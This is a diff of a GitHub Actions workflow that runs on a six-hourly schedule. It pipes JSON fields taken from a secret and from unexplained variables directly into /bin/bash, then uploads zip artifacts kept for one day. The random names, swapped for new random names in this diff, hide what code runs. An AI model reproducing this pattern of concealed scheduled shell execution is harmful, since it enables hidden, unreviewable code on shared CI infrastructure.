@@ -1,24 +1,29 @@
 name: jiejinpanbai
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '16 5/6 * * *'
 
-jobs:  # 11587
+  schedule:
+    - cron: '37 0,6,12,18 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: jiejinpanbai
         env:
-          gahh248: ${{ secrets.gahh248 }}
+          u86536: ${{ secrets.u86536 }}
         run: |
-          echo $gahh248 | jq -r .k279 | /bin/bash
-          echo $p61176 | jq -r .wc63 | /bin/bash
-          echo $skn33 | jq -r .yd04 | /bin/bash
-          echo $ngykp6 | jq -r .nt4 | /bin/bash
-          echo $uldoz8500 | jq -r .nwzns6301 | /bin/bash
-          echo $m869 | jq -r .kcjey5536 | /bin/bash
-          echo $mh1027 | jq -r .y3 | /bin/bash
-          echo $nbo8 | jq -r .hiwb35415 | /bin/bash
+          printf '%s' "$u86536" | jq -r .p18001 | /bin/bash
+          printf '%s' "$xobxq76240" | jq -r .u613 | /bin/bash
+          echo $hmn37 | jq -r .goh21216 | /bin/bash
+          printf '%s' "$g1" | jq -r .ane21 | /bin/bash
+          echo $kisei68 | jq -r .ugxhb9650 | /bin/bash
+          echo $dj0 | jq -r .ftcjx9056 | /bin/bash
+          echo $tjnkh6929 | jq -r .b535 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: zp0nM464
+          path: "*.zip"
+          retention-days: 1
